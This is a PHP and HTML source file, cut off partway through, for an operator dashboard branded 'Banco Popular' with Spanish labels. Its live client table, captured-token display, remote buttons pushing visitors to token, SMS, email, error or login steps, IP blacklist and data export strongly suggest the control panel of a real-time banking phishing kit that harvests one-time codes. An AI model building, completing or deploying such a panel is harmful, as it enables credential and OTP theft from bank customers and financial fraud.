<?php
/**
 * ECO // BANCO POPULAR - COMMAND CENTER & TELEMETRY HUB
 * Full-Featured Operator Dashboard with Collapsible Sidebar, Real-Time Presence & Web Audio Alerts
 */
require_once __DIR__ . '/../config.php';
checkAdminSession();

// Logout handler
if (isset($_GET['param']) && $_GET['param'] === 'logout') {
    $_SESSION = [];
    if (ini_get("session.use_cookies")) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000,
            $params["path"], $params["domain"],
            $params["secure"], $params["httponly"]
        );
    }
    session_destroy();
    header('Location: login.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PANEL ADMIN // CENTRO DE COMANDO</title>
    <link rel="icon" type="image/png" href="../assets/logos/principalmd.png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.2.0/fonts/remixicon.css" rel="stylesheet">
    <style>
        :root {
            /* Backgrounds */
            --bg-base: #06090e;
            --bg-sidebar: #0a0e17;
            --bg-surface: rgba(14, 20, 32, 0.75);
            --bg-surface-elevated: rgba(20, 29, 48, 0.85);
            --bg-card: rgba(18, 26, 44, 0.55);
            --bg-card-hover: rgba(26, 38, 64, 0.75);
            
            /* Borders */
            --border-subtle: rgba(255, 255, 255, 0.08);
            --border-highlight: rgba(0, 212, 255, 0.35);
            
            /* Brand Accents - Popular Tech */
            --teal-brand: #105163;
            --teal-bright: #146c84;
            --cyan-accent: #00d4ff;
            --cyan-glow: rgba(0, 212, 255, 0.25);
            
            --emerald: #10b981;
            --emerald-glow: rgba(16, 185, 129, 0.25);
            --amber: #f59e0b;
            --amber-glow: rgba(245, 158, 11, 0.25);
            --rose: #f43f5e;
            --rose-glow: rgba(244, 63, 94, 0.25);
            --purple: #8b5cf6;

            /* Text */
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --text-tertiary: #64748b;

            /* Fonts */
            --font-sans: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
            --font-mono: 'JetBrains Mono', monospace;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: var(--font-sans);
            -webkit-font-smoothing: antialiased;
        }

        body {
            background-color: var(--bg-base);
            background-image: 
                radial-gradient(circle at 10% 15%, rgba(16, 81, 99, 0.18) 0%, transparent 40%),
                radial-gradient(circle at 90% 85%, rgba(16, 185, 129, 0.1) 0%, transparent 40%),
                radial-gradient(circle at 50% 50%, rgba(0, 212, 255, 0.03) 0%, transparent 60%);
            color: var(--text-primary);
            height: 100vh;
            display: grid;
            grid-template-columns: 285px 1fr;
            overflow: hidden;
            transition: grid-template-columns 0.32s cubic-bezier(0.16, 1, 0.3, 1);
        }

        body.sidebar-collapsed {
            grid-template-columns: 0px 1fr;
        }

        /* Ambient Glow Bar */
        .ambient-top-line {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: 2.5px;
            background: linear-gradient(90deg, #105163, #00d4ff, #10b981, #f59e0b, #105163);
            background-size: 300% 100%;
            animation: gradientAnim 7s linear infinite;
            z-index: 9999;
        }

        @keyframes gradientAnim {
            0% { background-position: 0% 0%; }
            100% { background-position: 300% 0%; }
        }

        /* =========================================================
           SIDEBAR STYLING
           ========================================================= */
        .sidebar {
            background: var(--bg-sidebar);
            border-right: 1px solid var(--border-subtle);
            display: flex;
            flex-direction: column;
            padding: 22px 18px;
            height: 100vh;
            overflow-y: auto;
            min-width: 285px;
            z-index: 100;
            transition: all 0.32s cubic-bezier(0.16, 1, 0.3, 1);
        }

        body.sidebar-collapsed .sidebar {
            min-width: 0;
            width: 0;
            padding: 0;
            opacity: 0;
            pointer-events: none;
            transform: translateX(-100%);
        }

        /* Brand Header */
        .brand-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding-bottom: 20px;
            margin-bottom: 16px;
            border-bottom: 1px solid var(--border-subtle);
        }

        .brand-logo-wrap {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .brand-icon-box {
            width: 40px;
            height: 40px;
            border-radius: 10px;
            background: linear-gradient(135deg, rgba(16, 81, 99, 0.5), rgba(0, 212, 255, 0.2));
            border: 1px solid rgba(0, 212, 255, 0.4);
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 16px var(--cyan-glow);
        }

        .brand-icon-box img {
            width: 22px;
            height: auto;
        }

        .brand-text-title {
            font-weight: 800;
            font-size: 15px;
            letter-spacing: -0.01em;
            color: #ffffff;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .brand-text-subtitle {
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            color: var(--cyan-accent);
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .live-dot {
            width: 6px;
            height: 6px;
            background: var(--emerald);
            border-radius: 50%;
            box-shadow: 0 0 8px var(--emerald);
            animation: pulseDot 1.6s infinite;
        }

        @keyframes pulseDot {
            0%, 100% { opacity: 0.4; transform: scale(0.9); }
            50% { opacity: 1; transform: scale(1.2); }
        }

        /* Navigation List */
        .nav-category {
            font-size: 10.5px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            color: var(--text-tertiary);
            margin: 12px 0 8px 8px;
        }

        .nav-list {
            list-style: none;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .nav-item-btn {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 10px 14px;
            border-radius: 10px;
            color: var(--text-secondary);
            font-size: 12.5px;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
            border: 1px solid transparent;
            background: none;
            width: 100%;
            text-align: left;
            transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
        }

        .nav-item-btn i {
            font-size: 17px;
            color: var(--text-tertiary);
            transition: transform 0.2s, color 0.2s;
        }

        .nav-item-btn:hover {
            background: var(--bg-surface-elevated);
            color: #ffffff;
            border-color: var(--border-subtle);
            transform: translateX(3px);
        }

        .nav-item-btn:hover i {
            color: var(--cyan-accent);
            transform: scale(1.1);
        }

        .nav-item-btn.active {
            background: linear-gradient(135deg, rgba(16, 81, 99, 0.35), rgba(0, 212, 255, 0.15));
            color: #ffffff;
            border-color: rgba(0, 212, 255, 0.35);
            box-shadow: 0 4px 15px rgba(16, 81, 99, 0.25);
        }

        .nav-item-btn.active i {
            color: var(--cyan-accent);
        }

        .nav-badge-count {
            margin-left: auto;
            background: rgba(16, 185, 129, 0.15);
            border: 1px solid rgba(16, 185, 129, 0.3);
            color: var(--emerald);
            font-size: 10px;
            font-family: var(--font-mono);
            font-weight: 700;
            padding: 2px 7px;
            border-radius: 9999px;
        }

        /* Sidebar Notes Section */
        .sidebar-notes-box {
            background: rgba(14, 20, 32, 0.6);
            border: 1px solid var(--border-subtle);
            border-radius: 12px;
            padding: 12px;
            margin-top: 14px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .notes-header-flex {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .notes-label-tag {
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            color: var(--text-secondary);
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .note-saved-pill {
            font-size: 10px;
            color: var(--emerald);
            opacity: 0;
            transition: opacity 0.25s;
            display: inline-flex;
            align-items: center;
            gap: 3px;
        }

        .note-saved-pill.show {
            opacity: 1;
        }

        .sidebar-note-area {
            width: 100%;
            background: var(--bg-base);
            border: 1px solid var(--border-subtle);
            border-radius: 8px;
            color: #f1f5f9;
            font-size: 11.5px;
            padding: 8px 10px;
            resize: vertical;
            min-height: 72px;
            outline: none;
            transition: border-color 0.2s;
        }

        .sidebar-note-area:focus {
            border-color: var(--cyan-accent);
            box-shadow: 0 0 10px var(--cyan-glow);
        }

        /* Sidebar Bottom / Operator zone */
        .sidebar-footer-zone {
            margin-top: auto;
            padding-top: 14px;
            border-top: 1px solid var(--border-subtle);
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .operator-card {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--border-subtle);
            padding: 8px 12px;
            border-radius: 10px;
        }

        .operator-info {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .operator-avatar {
            width: 30px;
            height: 30px;
            border-radius: 8px;
            background: var(--teal-brand);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-weight: 700;
            font-size: 12px;
        }

        .operator-name {
            font-size: 12px;
            font-weight: 700;
            color: #ffffff;
        }

        .operator-role {
            font-size: 10px;
            color: var(--text-tertiary);
        }

        .btn-sidebar-logout {
            color: #fda4af;
            background: rgba(244, 63, 94, 0.1);
            border: 1px solid rgba(244, 63, 94, 0.2);
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 12px;
            font-weight: 600;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            transition: all 0.2s;
        }

        .btn-sidebar-logout:hover {
            background: rgba(244, 63, 94, 0.25);
            color: #ffffff;
        }

        /* =========================================================
           MAIN VIEWPORT & TOPBAR
           ========================================================= */
        .main-viewport {
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
        }

        .topbar-header {
            background: var(--bg-surface);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-bottom: 1px solid var(--border-subtle);
            padding: 12px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-shrink: 0;
            z-index: 50;
        }

        .topbar-left {
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .btn-toggle-sidebar {
            width: 36px;
            height: 36px;
            border-radius: 8px;
            background: var(--bg-surface-elevated);
            border: 1px solid var(--border-subtle);
            color: var(--text-secondary);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 18px;
            transition: all 0.2s;
        }

        .btn-toggle-sidebar:hover {
            color: #ffffff;
            border-color: var(--cyan-accent);
            box-shadow: 0 0 10px var(--cyan-glow);
        }

        .search-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .search-wrapper i {
            position: absolute;
            left: 12px;
            color: var(--text-tertiary);
            font-size: 15px;
            pointer-events: none;
        }

        .top-search-input {
            background: rgba(0, 0, 0, 0.35);
            border: 1px solid var(--border-subtle);
            border-radius: 8px;
            padding: 7px 14px 7px 36px;
            color: #ffffff;
            font-size: 12px;
            width: 240px;
            outline: none;
            transition: all 0.25s;
        }

        .top-search-input:focus {
            width: 310px;
            border-color: var(--cyan-accent);
            box-shadow: 0 0 12px var(--cyan-glow);
        }

        .topbar-right {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .clock-badge {
            font-family: var(--font-mono);
            font-size: 12px;
            color: var(--text-secondary);
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid var(--border-subtle);
            padding: 6px 12px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .btn-audio-toggle {
            display: flex;
            align-items: center;
            gap: 6px;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid var(--border-subtle);
            color: var(--text-secondary);
            padding: 6px 12px;
            border-radius: 8px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-audio-toggle.active {
            color: var(--emerald);
            border-color: rgba(16, 185, 129, 0.35);
            background: rgba(16, 185, 129, 0.12);
        }

        .btn-tool-icon {
            width: 36px;
            height: 36px;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid var(--border-subtle);
            color: var(--text-secondary);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 16px;
            transition: all 0.2s;
        }

        .btn-tool-icon:hover {
            color: #ffffff;
            border-color: rgba(255, 255, 255, 0.2);
        }

        /* =========================================================
           WORKSPACE CONTENT & METRICS GRID
           ========================================================= */
        .workspace-content {
            flex: 1;
            padding: 22px 26px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .metrics-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 16px;
        }

        @media (max-width: 1024px) {
            .metrics-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        .metric-card {
            background: var(--bg-card);
            border: 1px solid var(--border-subtle);
            border-radius: 14px;
            padding: 16px 18px;
            backdrop-filter: blur(16px);
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: relative;
            overflow: hidden;
            transition: transform 0.2s, border-color 0.2s;
        }

        .metric-card:hover {
            transform: translateY(-2px);
            border-color: rgba(255, 255, 255, 0.15);
        }

        .metric-card::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, currentColor, transparent);
            opacity: 0.4;
        }

        .metric-card.cyan { color: var(--cyan-accent); }
        .metric-card.emerald { color: var(--emerald); }
        .metric-card.amber { color: var(--amber); }
        .metric-card.purple { color: var(--purple); }

        .metric-info h4 {
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            color: var(--text-tertiary);
            margin-bottom: 4px;
        }

        .metric-number {
            font-family: var(--font-mono);
            font-size: 26px;
            font-weight: 800;
            letter-spacing: -0.02em;
            color: #ffffff;
        }

        .metric-icon-box {
            width: 44px;
            height: 44px;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--border-subtle);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
        }

        /* =========================================================
           DATA TABLE & WORKSPACE SPLIT
           ========================================================= */
        .telemetry-main-panel {
            background: var(--bg-card);
            border: 1px solid var(--border-subtle);
            border-radius: 16px;
            backdrop-filter: blur(20px);
            overflow: hidden;
            display: flex;
            flex-direction: column;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
        }

        .panel-header-toolbar {
            padding: 14px 20px;
            border-bottom: 1px solid var(--border-subtle);
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 12px;
            background: rgba(255, 255, 255, 0.015);
        }

        .panel-title-group {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .panel-title-text {
            font-size: 14px;
            font-weight: 700;
            color: #ffffff;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        /* Filter Pills */
        .filter-pills-bar {
            display: flex;
            align-items: center;
            gap: 4px;
            background: rgba(0, 0, 0, 0.25);
            padding: 3px;
            border-radius: 8px;
            border: 1px solid var(--border-subtle);
        }

        .filter-btn {
            background: none;
            border: none;
            color: var(--text-secondary);
            font-size: 11px;
            font-weight: 600;
            padding: 4px 10px;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .filter-btn:hover {
            color: #ffffff;
        }

        .filter-btn.active {
            background: var(--teal-brand);
            color: #ffffff;
            box-shadow: 0 2px 8px rgba(16, 81, 99, 0.4);
        }

        .panel-action-buttons {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .btn-action-tool {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            padding: 6px 12px;
            border-radius: 8px;
            font-size: 11.5px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.2s;
            border: 1px solid transparent;
        }

        .btn-action-tool.csv {
            background: rgba(0, 212, 255, 0.12);
            color: var(--cyan-accent);
            border-color: rgba(0, 212, 255, 0.3);
        }
        .btn-action-tool.csv:hover {
            background: rgba(0, 212, 255, 0.25);
            color: #ffffff;
        }

        .btn-action-tool.danger {
            background: rgba(244, 63, 94, 0.1);
            color: #fda4af;
            border-color: rgba(244, 63, 94, 0.25);
        }
        .btn-action-tool.danger:hover {
            background: rgba(244, 63, 94, 0.25);
            color: #ffffff;
        }

        /* Table Design */
        .table-responsive-box {
            width: 100%;
            overflow-x: auto;
        }

        .telemetry-table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
            font-size: 12.5px;
        }

        .telemetry-table th {
            background: rgba(0, 0, 0, 0.2);
            padding: 12px 16px;
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.7px;
            color: var(--text-tertiary);
            border-bottom: 1px solid var(--border-subtle);
            white-space: nowrap;
        }

        .telemetry-table td {
            padding: 13px 16px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
            vertical-align: middle;
            color: #cbd5e1;
        }

        .telemetry-table tbody tr {
            transition: background 0.15s;
        }

        .telemetry-table tbody tr:hover {
            background: rgba(255, 255, 255, 0.025);
        }

        .telemetry-table tbody tr.row-new-token {
            background: rgba(16, 185, 129, 0.08) !important;
            box-shadow: inset 3px 0 0 var(--emerald);
        }

        /* Chips & Pills */
        .copy-pill {
            font-family: var(--font-mono);
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid var(--border-subtle);
            padding: 4px 8px;
            border-radius: 6px;
            font-weight: 700;
            color: #ffffff;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            transition: all 0.15s;
        }

        .copy-pill:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: rgba(255, 255, 255, 0.2);
            color: var(--cyan-accent);
        }

        .token-glow-box {
            font-family: var(--font-mono);
            font-size: 13.5px;
            font-weight: 800;
            letter-spacing: 1px;
            color: #10b981;
            background: rgba(16, 185, 129, 0.15);
            border: 1px solid rgba(16, 185, 129, 0.45);
            padding: 5px 10px;
            border-radius: 8px;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
            box-shadow: 0 0 12px rgba(16, 185, 129, 0.25);
            transition: all 0.2s;
        }

        .token-glow-box:hover {
            background: rgba(16, 185, 129, 0.28);
            transform: scale(1.02);
        }

        .token-empty {
            color: var(--text-tertiary);
            font-size: 11px;
            font-style: italic;
        }

        /* Presence Badges */
        .badge {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            padding: 3px 8px;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 700;
            white-space: nowrap;
        }

        .badge-online { background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.35); }
        .badge-offline { background: rgba(148, 163, 184, 0.1); color: #94a3b8; border: 1px solid rgba(148, 163, 184, 0.2); }
        .badge-typing { background: rgba(245, 158, 11, 0.15); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.35); }
        
        .badge-status {
            font-family: var(--font-mono);
            font-size: 10px;
            padding: 2px 7px;
            border-radius: 4px;
            text-transform: uppercase;
        }
        .status-waiting { background: rgba(148, 163, 184, 0.12); color: #cbd5e1; }
        .status-token { background: rgba(0, 212, 255, 0.18); color: var(--cyan-accent); border: 1px solid rgba(0, 212, 255, 0.3); }
        .status-sms { background: rgba(14, 165, 233, 0.18); color: #38bdf8; border: 1px solid rgba(14, 165, 233, 0.3); }
        .status-correo { background: rgba(168, 85, 247, 0.18); color: #c084fc; border: 1px solid rgba(168, 85, 247, 0.3); }
        .status-error-token { background: rgba(244, 63, 94, 0.18); color: #fda4af; border: 1px solid rgba(244, 63, 94, 0.3); }
        .status-finish { background: rgba(16, 185, 129, 0.18); color: #6ee7b7; border: 1px solid rgba(16, 185, 129, 0.3); }
        .status-login { background: rgba(139, 92, 246, 0.18); color: #c4b5fd; border: 1px solid rgba(139, 92, 246, 0.3); }

        /* Remote Action Buttons */
        .actions-flex {
            display: flex;
            align-items: center;
            gap: 5px;
            justify-content: flex-end;
            flex-wrap: wrap;
        }

        .act-btn {
            border: none;
            padding: 5px 8px;
            border-radius: 6px;
            font-size: 11px;
            font-weight: 700;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            transition: all 0.15s;
        }

        .btn-act-token {
            background: rgba(0, 212, 255, 0.14);
            color: var(--cyan-accent);
            border: 1px solid rgba(0, 212, 255, 0.35);
        }
        .btn-act-token:hover {
            background: rgba(0, 212, 255, 0.3);
            color: #ffffff;
        }

        .btn-act-error {
            background: rgba(245, 158, 11, 0.14);
            color: var(--amber);
            border: 1px solid rgba(245, 158, 11, 0.35);
        }
        .btn-act-error:hover {
            background: rgba(245, 158, 11, 0.3);
            color: #ffffff;
        }

        .btn-act-finish {
            background: rgba(16, 185, 129, 0.14);
            color: var(--emerald);
            border: 1px solid rgba(16, 185, 129, 0.35);
        }
        .btn-act-finish:hover {
            background: rgba(16, 185, 129, 0.3);
            color: #ffffff;
        }

        .btn-act-login {
            background: rgba(139, 92, 246, 0.14);
            color: var(--purple);
            border: 1px solid rgba(139, 92, 246, 0.35);
        }
        .btn-act-login:hover {
            background: rgba(139, 92, 246, 0.3);
            color: #ffffff;
        }

        .btn-act-del {
            background: rgba(244, 63, 94, 0.1);
            color: #fda4af;
            border: 1px solid rgba(244, 63, 94, 0.25);
            padding: 5px 7px;
            border-radius: 6px;
            cursor: pointer;
        }
        .btn-act-del:hover {
            background: rgba(244, 63, 94, 0.3);
            color: #ffffff;
        }

        .btn-act-ban {
            background: rgba(255, 255, 255, 0.05);
            color: #cbd5e1;
            border: 1px solid var(--border-subtle);
            padding: 5px 7px;
            border-radius: 6px;
            cursor: pointer;
        }
        .btn-act-ban:hover {
            background: rgba(244, 63, 94, 0.2);
            color: var(--rose);
            border-color: rgba(244, 63, 94, 0.4);
        }

        /* Bottom Section: Audit Log */
        .bottom-audit-panel {
            background: var(--bg-card);
            border: 1px solid var(--border-subtle);
            border-radius: 14px;
            padding: 14px 18px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .audit-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .audit-logs-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
            gap: 10px;
            max-height: 140px;
            overflow-y: auto;
        }

        .audit-chip {
            background: rgba(255, 255, 255, 0.025);
            border-left: 2px solid var(--cyan-accent);
            padding: 6px 10px;
            border-radius: 6px;
            font-size: 11.5px;
            display: flex;
            flex-direction: column;
            gap: 2px;
        }

        .audit-chip-meta {
            display: flex;
            justify-content: space-between;
            color: var(--text-tertiary);
            font-size: 10px;
        }

        /* =========================================================
           MODALS & TOASTS
           ========================================================= */
        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.72);
            backdrop-filter: blur(8px);
            z-index: 10000;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .modal-card {
            background: #0c121e;
            border: 1px solid var(--border-subtle);
            border-radius: 16px;
            width: 100%;
            max-width: 580px;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.85);
            overflow: hidden;
            animation: modalPop 0.25s ease-out;
        }

        @keyframes modalPop {
            from { opacity: 0; transform: scale(0.96); }
            to { opacity: 1; transform: scale(1); }
        }

        .toast-container {
            position: fixed;
            bottom: 24px;
            right: 24px;
            z-index: 99999;
            display: flex;
            flex-direction: column;
            gap: 8px;
            pointer-events: none;
        }

        .toast-msg {
            background: rgba(12, 18, 30, 0.96);
            border: 1px solid rgba(0, 212, 255, 0.3);
            color: #ffffff;
            padding: 12px 18px;
            border-radius: 10px;
            font-size: 12.5px;
            font-weight: 600;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
            display: flex;
            align-items: center;
            gap: 10px;
            animation: slideInRight 0.3s ease-out;
            pointer-events: auto;
        }

        @keyframes slideInRight {
            from { opacity: 0; transform: translateX(30px); }
            to { opacity: 1; transform: translateX(0); }
        }

        .empty-state {
            padding: 48px 24px;
            text-align: center;
            color: var(--text-tertiary);
        }
        .empty-state i {
            font-size: 40px;
            margin-bottom: 10px;
            opacity: 0.5;
            display: block;
        }
    </style>
</head>
<body>
    <!-- Top Ambient Glow Line -->
    <div class="ambient-top-line"></div>

    <!-- LEFT SIDEBAR -->
    <aside class="sidebar" id="main-sidebar">
        <!-- Brand Header -->
        <div class="brand-container">
            <div class="brand-logo-wrap">
                <div class="brand-icon-box" style="display:flex;align-items:center;justify-content:center;background:rgba(21,62,126,0.35);border:1px solid rgba(21,62,126,0.6);border-radius:10px;padding:4px;">
                    <img src="../assets/logos/principalmd.png" alt="Panel Admin" style="max-width:100%;max-height:100%;object-fit:contain;">
                </div>
                <div>
                    <div class="brand-text-title">PANEL ADMIN</div>
                    <div class="brand-text-subtitle">
                        <span class="live-dot"></span> Telemetría en Vivo
                    </div>
                </div>
            </div>
        </div>

        <!-- Navigation Categories -->
        <div class="nav-category">Navegación Principal</div>
        <ul class="nav-list">
            <li>
                <button class="nav-item-btn active" onclick="scrollToTop()">
                    <i class="ri-dashboard-3-line"></i>
                    <span>Telemetría en Vivo</span>
                    <span class="nav-badge-count" id="badge-online-count">0</span>
                </button>
            </li>
            <li>
                <button class="nav-item-btn" onclick="openBlacklistModal()">
                    <i class="ri-shield-cross-line"></i>
                    <span>Lista Negra de IPs</span>
                </button>
            </li>
            <li>
                <button class="nav-item-btn" onclick="window.location.href='export.php?format=csv'">
                    <i class="ri-file-excel-2-line"></i>
                    <span>Exportar CSV</span>
                </button>
            </li>
            <li>
                <button class="nav-item-btn" onclick="window.location.href='export.php?format=txt'">
                    <i class="ri-file-text-line"></i>
                    <span>Exportar TXT</span>
                </button>
            </li>
            <li>
                <button class="nav-item-btn" onclick="openPurgeModal()" style="color: #fda4af;">
                    <i class="ri-delete-bin-line" style="color: #fda4af;"></i>
                    <span>Purgar Base de Datos</span>
                </button>
            </li>
        </ul>

        <!-- Operator Shift Notes (Direct in Sidebar) -->
        <div class="nav-category" style="margin-top: 18px;">Bloc de Operador</div>
        <div class="sidebar-notes-box">
            <div class="notes-header-flex">
                <span class="notes-label-tag">
                    <i class="ri-edit-line" style="color: var(--amber);"></i> Nota #1
                </span>
                <span class="note-saved-pill" id="note1-saved">
                    <i class="ri-check-line"></i> Guardado
                </span>
            </div>
            <textarea class="sidebar-note-area" id="note-1" placeholder="Casos de llamada, cédulas o turnos..." oninput="queueSaveNote(1)"></textarea>

            <div class="notes-header-flex" style="margin-top: 4px;">
                <span class="notes-label-tag">
                    <i class="ri-edit-line" style="color: var(--cyan-accent);"></i> Nota #2
                </span>
                <span class="note-saved-pill" id="note2-saved">
                    <i class="ri-check-line"></i> Guardado
                </span>
            </div>
            <textarea class="sidebar-note-area" id="note-2" placeholder="Recordatorios o IPs sospechosas..." oninput="queueSaveNote(2)"></textarea>
        </div>

        <!-- Sidebar Footer & Operator Info -->
        <div class="sidebar-footer-zone">
            <div class="operator-card">
                <div class="operator-info">
                    <div class="operator-avatar">
                        <i class="ri-shield-user-line"></i>
                    </div>
                    <div>
                        <div class="operator-name"><?= htmlspecialchars($_SESSION['op_name'] ?? ADMIN_USER, ENT_QUOTES, 'UTF-8') ?></div>
                        <div class="operator-role">Operador Autorizado</div>
                    </div>
                </div>
            </div>
            <a href="index.php?param=logout" class="btn-sidebar-logout" title="Cerrar sesión de forma segura">
                <i class="ri-logout-box-r-line"></i>
                <span>Cerrar Sesión</span>
            </a>
        </div>
    </aside>

    <!-- MAIN VIEWPORT -->
    <div class="main-viewport">
        <!-- Topbar Header -->
        <header class="topbar-header">
            <div class="topbar-left">
                <button class="btn-toggle-sidebar" id="toggle-sidebar" onclick="toggleSidebar()" title="Colapsar / Expandir Barra Lateral">
                    <i class="ri-menu-line" id="toggle-sidebar-icon"></i>
                </button>

                <!-- Search Box -->
                <div class="search-wrapper">
                    <i class="ri-search-line"></i>
                    <input type="text" class="top-search-input" id="search-input" placeholder="Buscar por documento, IP, token..." oninput="handleSearch()">
                </div>
            </div>

            <div class="topbar-right">
                <!-- Clock Badge -->
                <div class="clock-badge">
                    <i class="ri-time-line" style="color: var(--cyan-accent);"></i>
                    <span id="live-clock-txt">--:--:--</span>
                </div>

                <!-- Audio Toggle Button -->
                <button id="btn-audio" class="btn-audio-toggle active" onclick="toggleAudio()" title="Activar / Silenciar Alertas Sonoras">
                    <i class="ri-volume-up-line" id="audio-icon"></i>
                    <span id="audio-label">Sonido Activo</span>
                </button>

                <!-- Test Audio Sound Button -->
                <button class="btn-tool-icon" onclick="testSoundAlert()" title="Probar Alerta Sonora (Token)">
                    <i class="ri-notification-badge-line" style="color: var(--emerald);"></i>
                </button>

                <!-- Quick CSV export button -->
                <button class="btn-tool-icon" onclick="window.location.href='export.php?format=csv'" title="Descargar reporte CSV">
                    <i class="ri-download-2-line"></i>
                </button>
            </div>
        </header>

        <!-- Scrollable Workspace Content -->
        <main class="workspace-content" id="workspace-content">

            <!-- Main Data Telemetry Panel -->
            <section class="telemetry-main-panel">
                <div class="panel-header-toolbar">
                    <div class="panel-title-group">
                        <h2 class="panel-title-text">
                            <i class="ri-terminal-window-line" style="color: var(--cyan-accent);"></i>
                            Telemetría en Vivo de Clientes
                        </h2>

                        <!-- Filter Bar -->
                        <div class="filter-pills-bar">
                            <button class="filter-btn active" data-filter="all" onclick="setFilter('all')">Todos</button>
                            <button class="filter-btn" data-filter="online" onclick="setFilter('online')">En Línea</button>
                            <button class="filter-btn" data-filter="token" onclick="setFilter('token')">Con Token</button>
                            <button class="filter-btn" data-filter="waiting" onclick="setFilter('waiting')">En Espera</button>
                            <button class="filter-btn" data-filter="finish" onclick="setFilter('finish')">Finalizados</button>
                        </div>
                    </div>

                    <div class="panel-action-buttons">
                        <button class="btn-action-tool csv" onclick="window.location.href='export.php?format=csv'">
                            <i class="ri-download-line"></i> Exportar CSV
                        </button>
                        <button class="btn-action-tool danger" onclick="openPurgeModal()">
                            <i class="ri-delete-bin-line"></i> Purgar
                        </button>
                    </div>
                </div>

                <!-- Table Content -->
                <div class="table-responsive-box">
